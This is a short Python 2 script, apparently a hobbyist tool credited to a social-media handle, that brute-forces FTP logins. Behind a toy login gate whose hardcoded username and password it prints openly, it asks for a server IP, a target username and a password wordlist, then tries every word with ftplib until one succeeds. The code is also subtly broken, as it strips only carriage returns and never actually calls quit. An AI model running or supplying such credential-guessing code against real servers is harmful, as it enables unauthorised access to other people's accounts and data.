print "This Tool Have Been Programmed By @c1ph3r_cr4ck3r"
print "Facebook :https://www.facebook.com/adam_abdallah"
print "Instagram:https://www.instagram.ccom/c1ph3r_cr4ck3r"
print "Github    :http://www.github.com/c1ph3r_cr4ck3r"
print "Important Note: "
print "Username Is: Adam"
print "Password Is: Adam123"
import ftplib
from time import *
import getpass

CorrectUsername = "Adam"
CorrectPassword = "Adam123" 

loop = 'true'
while (loop == 'true'):

    username = raw_input("Please enter your username: ")

    if (username == CorrectUsername):
        loop1 = 'true'
        while (loop1 == 'true'):
            password = getpass.getpass("Please enter your password: ")
            if (password == CorrectPassword):
                print "Logged in successfully as " + username
                loop = 'false'
                loop1 = 'false'

                
            else:
                print "Password incorrect!"

    else:
        print "Username incorrect!"
    

import ftplib 

server=raw_input("What is the IP Address of the FTP server: ")

print(server)



username=raw_input("Waht username are you trying to crack: ")

print(username)



passwordlist=raw_input("Please provide the path and foilename for your password list: ")

print(passwordlist)


try:

    with open(passwordlist, 'r') as pw:

        for word in pw:
            word=word.strip('\r')

            try:
                ftp=ftplib.FTP(server)
                ftp.login(username,word)
                print('Success! You Have Coonected To The FTP Server. The password is ' + word)
                ftp.quit

            except:
                print("still trying....")

except:
    print("You Have A Worldlist Error. Either The file Does Not Exist For The Wrong Path")
